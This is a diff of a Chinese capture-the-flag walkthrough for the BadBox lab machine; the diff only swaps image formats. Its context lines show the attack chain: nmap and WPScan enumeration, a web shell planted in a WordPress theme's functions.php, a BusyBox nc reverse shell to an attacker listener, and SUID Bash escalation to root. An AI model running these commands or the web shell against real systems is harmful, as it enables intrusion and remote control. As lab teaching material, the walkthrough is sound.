@@ -11,7 +11,7 @@
 | 开放端口 | 22/tcp、80/tcp |
 | 最终路径 | WordPress 弱口令 → 主题编辑器 WebShell → BusyBox 反弹 Shell → SUID Bash → setpriv root |
 
-![BadBox 靶机启动页](/content/badbox/image-01.png)
+![BadBox 靶机启动页](/content/badbox/image-01.webp)
 
 ## 1. 攻击链概览
 
@@ -38,7 +38,7 @@ nmap -sT -sV -sC -O -p- 192.168.134.60
 
 扫描结果只暴露 SSH 与 HTTP。Web 端返回 Apache 2.4.66，并能识别到 WordPress 7.0。
 
-![Nmap 端口与服务识别结果](/content/badbox/image-02.png)
+![Nmap 端口与服务识别结果](/content/badbox/image-02.webp)
 
 查看页面源码时发现站点引用了 badbox.dsz，因此把域名映射到靶机地址：
 
@@ -46,7 +46,7 @@ nmap -sT -sV -sC -O -p- 192.168.134.60
 echo "192.168.134.60 badbox.dsz" | sudo tee -a /etc/hosts
 ```
 
-![页面源码中泄露的 badbox.dsz 域名](/content/badbox/image-03.png)
+![页面源码中泄露的 badbox.dsz 域名](/content/badbox/image-03.webp)
 
 随后使用 WPScan 枚举用户：
 
@@ -56,7 +56,7 @@ wpscan --url http://192.168.134.60 --enumerate u
 
 结果识别出用户 yepian，同时确认 XML-RPC、上传目录列表与外部 WP-Cron 均处于可访问状态。
 
-![WPScan 枚举出 yepian 用户](/content/badbox/image-04.png)
+![WPScan 枚举出 yepian 用户](/content/badbox/image-04.webp)
 
 > 风险说明：用户枚举和口令测试会产生明显请求日志，也可能触发账户锁定。这里仅在本地靶场内验证。
 
@@ -78,7 +78,7 @@ if (isset($_GET['c'])) {
 ?>
 ```
 
-![使用 yepian 登录 WordPress 后台](/content/badbox/image-05.png) ![在 functions.php 中加入命令执行入口](/content/badbox/image-06.png)
+![使用 yepian 登录 WordPress 后台](/content/badbox/image-05.webp) ![在 functions.php 中加入命令执行入口](/content/badbox/image-06.webp)
 
 攻击机先监听 4444 端口，再通过 c 参数调用 BusyBox nc：
 
@@ -90,11 +90,11 @@ nc -lvnp 4444
 busybox nc 192.168.134.4 4444 -e /bin/sh
 ```
 
-![通过主题入口触发 BusyBox nc 回连](/content/badbox/image-07.png) ![获得 apache 身份的反弹 Shell](/content/badbox/image-08.png)
+![通过主题入口触发 BusyBox nc 回连](/content/badbox/image-07.webp) ![获得 apache 身份的反弹 Shell](/content/badbox/image-08.webp)
 
 回连成功后，当前目录位于 /var/www/html/wp-admin，进程身份为 apache。继续枚举 yepian 的家目录并读取 user flag。
 
-![读取 yepian 用户目录中的 user flag](/content/badbox/image-09.png)
+![读取 yepian 用户目录中的 user flag](/content/badbox/image-09.webp)
 
 ## 4. 提权：SUID Bash、BusyBox 与 Landlock
 
@@ -104,7 +104,7 @@ busybox nc 192.168.134.4 4444 -e /bin/sh
 find / -user root -perm -4000 -print 2>/dev/null
 ```
 
-![发现 /tmp/bash 与 /var/tmp/bash 两个 SUID Bash](/content/badbox/image-10.png)
+![发现 /tmp/bash 与 /var/tmp/bash 两个 SUID Bash](/content/badbox/image-10.webp)
 
 这里有两个容易混淆的点：
 
@@ -120,7 +120,7 @@ find / -user root -perm -4000 -print 2>/dev/null
 
 这条命令从 SUID Bash 启动新 Shell，并把真实 UID、真实 GID 与附加组一起切换到 root。验证 id 后可以进入 /root 并读取 root flag。
 
-![setpriv 后获得完整 root Shell](/content/badbox/image-11.png)
+![setpriv 后获得完整 root Shell](/content/badbox/image-11.webp)
 
 ### 备选思路：写入用户后重新 SSH
 
